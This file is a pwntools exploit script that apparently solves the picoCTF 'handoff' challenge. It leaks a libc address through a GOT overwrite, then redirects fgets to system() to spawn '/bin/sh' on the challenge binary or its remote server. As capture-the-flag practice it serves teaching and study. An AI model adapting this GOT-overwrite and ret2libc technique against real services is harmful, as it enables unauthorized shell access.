from pwn import *

def menu():
	p.recvline()
	p.recvline()
	p.recvline()
	p.recvline()

elf = ELF('./handoff')

p = elf.process()
sys_diff = -0x2f450
#p = remote('shape-facility.picoctf.net', 52983)
#sys_diff = -0x300e0

# calculate offset for new bp to later overwrite GOT
fgets_addr = elf.symbols['got.puts']
bp_before_entries_end = 0x10
entries_count = 12 # 11 over crashes because we overwrite the addresses of stdin and stdout
entries_size = 72 # 8 for name + 64 for message
name_offset = 8

# force program to run inside of .got.plt, calculate the offset to make entries[-2] directly on the GOT addresses
new_bp = fgets_addr + bp_before_entries_end + (entries_count) * entries_size - name_offset
menu()
log.info(f'Setting new %rbp: {hex(new_bp)}')
p.sendline(b'3')
p.recvline()
p.sendline(b'sybau ts pmo' + new_bp.to_bytes(8, byteorder='little') + (0x401249).to_bytes(8, byteorder='little'))

# set fgets() to puts() and fflush() to fgets() to be able to print address of puts() in the next step while retaining the ability to go back to change the addresses again later on
menu()
p.sendline(b'2')
p.recvline()
p.sendline(b'-2')
p.recvline()
p.sendline(
	 (0x401030).to_bytes(8, byteorder='little')	# puts
	+(0x401030).to_bytes(8, byteorder='little')	# fgets
	+(0x401050).to_bytes(8, byteorder='little')	# getchar
	+(0x401040).to_bytes(8, byteorder='little')	# fflush
	+(0x401070).to_bytes(8, byteorder='little')	# setvbuf
	+(0x401080).to_bytes(8, byteorder='little')	# scanf
	+(0x401090).to_bytes(8, byteorder='little')	# exit
)

# get address (those who know 💀) of system() by getting the address of puts() and adding the difference referenced from the libc db
menu()
p.sendline(b'2')
p.recvline()
p.sendline(b'-2')
p.recvline()
sys_addr = int.from_bytes(p.recvline()[:-1],byteorder='little') + sys_diff
log.info(f'system() address: {hex(sys_addr)}')

# reset the fgets() address by creating another recipient (calls fflush(), which resets the fgets() address because of the previous setting)
menu()
p.sendline(b'1')
p.recvline()
p.sendline(b'')

# add shell command
menu()
p.sendline(b'2')
p.recvline()
p.sendline(b'0')
p.recvline()
p.sendline(b'/bin/sh')

# set fgets() to system() to execute the shell
menu()
p.sendline(b'2')
p.recvline()
p.sendline(b'-2')
p.recvline()
p.sendline(
	 (0x401030).to_bytes(8, byteorder='little')	# puts
	+(sys_addr).to_bytes(8, byteorder='little')	# fgets
	+(0x401050).to_bytes(8, byteorder='little')	# getchar
	+(0x401060).to_bytes(8, byteorder='little')	# fflush
	+(0x401070).to_bytes(8, byteorder='little')	# setvbuf
	+(0x401080).to_bytes(8, byteorder='little')	# scanf
	+(0x401090).to_bytes(8, byteorder='little')	# exit
)

# get revshell!
menu()
p.sendline(b'2')
p.recvline()
p.sendline(b'0')
p.interactive()

